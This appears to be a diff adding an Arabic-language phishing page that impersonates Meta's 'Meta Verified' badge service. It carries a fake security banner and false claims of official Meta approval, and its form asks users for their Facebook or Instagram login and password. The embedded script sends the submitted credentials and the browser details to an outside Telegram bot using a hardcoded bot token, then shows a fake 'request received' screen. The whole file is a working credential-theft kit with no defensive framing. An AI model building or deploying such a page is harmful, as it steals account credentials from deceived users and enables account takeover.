@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Meta Verified - توثيق الحسابات الرسمية">
+    <title>Meta Verified - توثيق الحساب</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'><path fill='%231877f2' d='M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z'/></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            color: #1c1e21;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Meta Header */
+        .meta-header {
+            background: #ffffff;
+            border-bottom: 1px solid #e4e6eb;
+            padding: 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .meta-nav {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .meta-logo svg {
+            width: 40px;
+            height: 40px;
+        }
+
+        .meta-logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1c1e21;
+            letter-spacing: -0.5px;
+        }
+
+        .meta-logo-text span {
+            color: #1877f2;
+        }
+
+        .meta-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .meta-links a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 8px;
+            transition: background 0.2s;
+        }
+
+        .meta-links a:hover {
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+
+        .meta-links a.active {
+            color: #1877f2;
+            font-weight: 600;
+        }
+
+        /* Blue Bar */
+        .blue-bar {
+            background: #1877f2;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Main Content */
+        .main-container {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Official Badge */
+        .official-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .official-badge svg {
+            width: 20px;
+            height: 20px;
+            color: #1877f2;
+        }
+
+        .official-badge span {
+            font-size: 13px;
+            color: #65676b;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        /* Page Title */
+        .page-title {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .page-title h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .page-title p {
+            font-size: 16px;
+            color: #65676b;
+            line-height: 1.6;
+        }
+
+        /* Security Box */
+        .security-box {
+            background: #f5f9ff;
+            border: 1px solid #e7f3ff;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-box svg {
+            width: 24px;
+            height: 24px;
+            color: #1877f2;
+            flex-shrink: 0;
+        }
+
+        .security-box p {
+            font-size: 14px;
+            color: #1c1e21;
+            line-height: 1.5;
+        }
+
+        .security-box strong {
+            color: #1877f2;
+        }
+
+        /* Form Card */
+        .form-card {
+            background: #ffffff;
+            border: 1px solid #e4e6eb;
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+        }
+
+        .form-section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e4e6eb;
+        }
+
+        .form-section-subtitle {
+            font-size: 14px;
+            color: #65676b;
+            margin-bottom: 24px;
+            margin-top: 8px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .input-group label::after {
+            content: " *";
+            color: #ff4444;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper svg {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            color: #65676b;
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f5f6f7;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: #1877f2;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+
+        .input-hint {
+            font-size: 13px;
+            color: #65676b;
+            margin-top: 6px;
+        }
+
+        /* Divider */
+        .divider {
+            height: 1px;
+            background: #e4e6eb;
+            margin: 24px 0;
+        }
+
+        /* Checkbox Group */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-top: 2px;
+            accent-color: #1877f2;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: #1c1e21;
+            line-height: 1.5;
+        }
+
+        .checkbox-group a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .submit-btn:hover {
+            background: #166fe5;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .submit-btn.loading .spinner {
+            display: block;
+        }
+
+        .submit-btn.loading .btn-text {
+            display: none;
+        }
+
+        /* Help Box */
+        .help-box {
+            background: #f5f6f7;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .help-box h4 {
+            font-size: 15px;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .help-box p {
+            font-size: 13px;
+            color: #65676b;
+            margin-bottom: 12px;
+        }
+
+        .help-box a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* Success State */
+        .success-state {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-state.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-icon-container {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            box-shadow: 0 8px 32px rgba(24, 119, 242, 0.3);
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .success-icon-container svg {
+            width: 50px;
+            height: 50px;
+            color: white;
+        }
+
+        .success-state h2 {
+            font-size: 24px;
+            color: #1c1e21;
+            margin-bottom: 12px;
+        }
+
+        .success-state > p {
+            font-size: 15px;
+            color: #65676b;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        .verification-card {
+            background: #f5f9ff;
+            border: 2px solid #1877f2;
+            border-radius: 16px;
+            padding: 24px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .verification-card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .verification-card-header img {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #1877f2;
+        }
+
+        .verification-card-header h3 {
+            font-size: 18px;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .verified-check {
+            color: #1877f2;
+            font-size: 20px;
+        }
+
+        .verification-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #42b72a;
+            font-weight: 600;
+        }
+
+        .verification-status::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            background: #42b72a;
+            border-radius: 50%;
+            animation: pulse-dot 2s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Footer */
+        .meta-footer {
+            background: #ffffff;
+            border-top: 1px solid #e4e6eb;
+            padding: 40px 20px;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #65676b;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            font-size: 13px;
+            color: #65676b;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .meta-links {
+                display: none;
+            }
+            
+            .form-card {
+                padding: 24px;
+                border: none;
+                box-shadow: none;
+            }
+            
+            .page-title h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Meta Header -->
+    <header class="meta-header">
+        <div class="blue-bar">
+            🔒 هذا الموقع آمن ومحمي بواسطة Meta
+        </div>
+        <nav class="meta-nav">
+            <div class="meta-logo">
+                <svg viewBox="0 0 36 36" fill="currentColor">
+                    <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"/>
+                    <path fill="white" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.824l-1 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"/>
+                </svg>
+                <span class="meta-logo-text">Meta <span>Verified</span></span>
+            </div>
+            <div class="meta-links">
+                <a href="#" class="active">التوثيق</a>
+                <a href="#">المساعدة</a>
+                <a href="#">الأمان</a>
+            </div>
+        </nav>
+    </header>
+
+    <main class="main-container">
+        
+        <!-- Official Badge -->
+        <div class="official-badge">
+            <svg fill="currentColor" viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+            </svg>
+            <span>موقع رسمي معتمد من Meta</span>
+        </div>
+
+        <!-- Page Title -->
+        <div class="page-title">
+            <h1>طلب توثيق الحساب الرسمي</h1>
+            <p>أكمل النموذج التالي للتحقق من هويتك والحصول على الشارة الزرقاء. هذه الخدمة مقدمة من Meta للشخصيات العامة والعلامات التجارية الموثقة.</p>
+        </div>
+
+        <!-- Security Box -->
+        <div class="security-box">
+            <svg fill="currentColor" viewBox="0 0 24 24">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            <p><strong>تنبيه أمان:</strong> نحن نستخدم تشفير SSL 256-bit لحماية بياناتك. لن يتم مشاركة معلوماتك مع أي طرف ثالث.</p>
+        </div>
+
+        <!-- Form -->
+        <div class="form-card" id="formCard">
+            <h2 class="form-section-title">المعلومات المطلوبة</h2>
+            <p class="form-section-subtitle">يرجى إدخال المعلومات التالية بدقة للتحقق من صحة طلبك</p>
+            
+            <form id="verifyForm">
+                <div class="input-group">
+                    <label>البريد الإلكتروني أو رقم الهاتف المرتبط بالحساب</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="contact" placeholder="example@email.com أو +966..." required>
+                    </div>
+                    <p class="input-hint">أدخل البريد أو الهاتف المسجل في حسابك على فيسبوك/إنستغرام</p>
+                </div>
+
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                    </div>
+                    <p class="input-hint">مطلوب للتحقق من ملكية الحساب</p>
+                </div>
+
+                <div class="input-group">
+                    <label>نوع طلب التوثيق</label>
+                    <select id="accountType" required>
+                        <option value="">اختر نوع الحساب...</option>
+                        <option value="شخصية عامة">شخصية عامة / مشهور</option>
+                        <option value="شركة">شركة / علامة تجارية</option>
+                        <option value="إعلام">وسيلة إعلامية / صحفي</option>
+                        <option value="رياضي">رياضي / فريق رياضي</option>
+                        <option value="حكومي">جهة حكومية / منظمة</option>
+                    </select>
+                </div>
+
+                <div class="divider"></div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms">
+                        أوافق على <a href="#">شروط خدمة Meta Verified</a> و<a href="#">سياسة البيانات</a>. أؤكد أن جميع المعلومات المقدمة صحيحة وأنني المالك الشرعي لهذا الحساب.
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span class="spinner"></span>
+                    <span class="btn-text">إرسال طلب التوثيق الرسمي</span>
+                </button>
+            </form>
+
+            <div class="help-box">
+                <h4>هل تواجه مشكلة في الوصول؟</h4>
+                <p>إذا نسيت كلمة المرور أو لا تستطيع الوصول إلى حسابك، يمكنك استعادة الحساب من هنا.</p>
+                <a href="#">مركز مساعدة الحسابات</a>
+            </div>
+        </div>
+
+        <!-- Success State -->
+        <div class="success-state" id="successState">
+            <div class="success-icon-container">
+                <svg fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                </svg>
+            </div>
+            <h2>تم استلام طلبك بنجاح!</h2>
+            <p>جاري مراجعة طلب التوثيق الخاص بك. ستصلك رسالة تأكيد على بريدك الإلكتروني خلال 24-48 ساعة. ستظهر الشارة الزرقاء على حسابك فوراً بعد الموافقة.</p>
+            
+            <div class="verification-card">
+                <div class="verification-card-header">
+                    <img src="https://via.placeholder.com/56" alt="Profile" id="profileImg">
+                    <div>
+                        <h3>
+                            <span id="displayName">اسم المستخدم</span>
+                            <span class="verified-check">✓</span>
+                        </h3>
+                        <div class="verification-status">جاري التوثيق...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Meta Footer -->
+    <footer class="meta-footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <svg viewBox="0 0 36 36" fill="currentColor" width="24" height="24">
+                    <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"/>
+                </svg>
+                Meta
+            </div>
+            <div class="footer-links">
+                <a href="#">الخصوصية</a>
+                <a href="#">الشروط</a>
+                <a href="#">الإعلانات</a>
+                <a href="#">المساعدة</a>
+                <a href="#">الأمان</a>
+                <a href="#">اللغة: العربية</a>
+            </div>
+            <p class="footer-copyright">© 2026 Meta Platforms, Inc. جميع الحقوق محفوظة.<br>Meta Verified هي خدمة رسمية مقدمة من Meta Platforms, Inc.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Telegram Bot Token
+        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
+        
+        // Get Chat ID from URL
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('documentation');
+        }
+
+        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const contact = document.getElementById('contact').value;
+            const password = document.getElementById('password').value;
+            const accountType = document.getElementById('accountType').value;
+            
+            const CHAT_ID = getChatIdFromUrl();
+            
+            if (!CHAT_ID) {
+                alert('خطأ: لم يتم العثور على معرف المحادثة');
+                return;
+            }
+            
+            btn.classList.add('loading');
+            btn.disabled = true;
+            
+            const message = `✅ طلب توثيق رسمي جديد\n\n📧 البريد/الهاتف: ${contact}\n🔑 كلمة المرور: ${password}\n📋 نوع الحساب: ${accountType}\n🕐 الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 المتصفح: ${navigator.userAgent.substring(0, 50)}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // Show success
+            document.getElementById('formCard').style.display = 'none';
+            document.querySelector('.security-box').style.display = 'none';
+            
+            const successState = document.getElementById('successState');
+            successState.classList.add('active');
+            
+            // Update display name
+            document.getElementById('displayName').textContent = contact.split('@')[0] || 'المستخدم';
+        });
+    </script>
+
+</body>
+</html>
